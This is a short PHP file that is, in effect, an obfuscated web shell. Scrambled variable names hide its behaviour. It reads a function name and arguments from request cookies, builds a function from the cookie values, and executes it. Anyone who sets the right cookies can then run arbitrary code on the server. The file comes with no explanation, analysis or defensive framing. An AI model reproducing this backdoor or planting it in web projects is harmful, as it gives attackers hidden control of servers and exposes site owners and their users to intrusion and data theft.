<?php

$axidh=$_COOKIE;
$eptfy=$axidh[fwrg];
if($eptfy){
	$rrow=$eptfy($axidh[wukd]);$qjlt=$eptfy($axidh[dhxc]);$kfvzh=$rrow("",$qjlt);$kfvzh();
}